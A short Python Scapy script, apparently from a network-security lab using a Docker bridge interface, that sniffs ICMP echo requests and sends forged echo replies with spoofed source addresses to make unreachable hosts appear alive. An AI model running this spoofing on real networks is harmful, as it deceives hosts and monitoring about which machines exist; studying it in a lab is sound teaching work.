from scapy.all import *

IFACE = "br-9e6e3b2d8339"

def spoof_reply(pkt):
    if not pkt.haslayer(ICMP) or not pkt.haslayer(IP):
        return
    
    request = pkt[ICMP]
    if request.type != 8:  # Only respond to echo requests
        return
    
    reply = (
        IP(src=pkt[IP].dst, dst=pkt[IP].src) /
        ICMP(type=0, id=request.id, seq=request.seq) /
        Raw(load=bytes(request.payload))
    )
    
    send(reply, verbose=False)
    print(f"False response: {reply[IP].src} -> {reply[IP].dst} (ICMP type {reply[ICMP].type},"
          f"id={request.id}, seq={request.seq})")
    
sniff(iface=IFACE, filter="icmp and icmp[0] == 8", prn=spoof_reply, store=False)
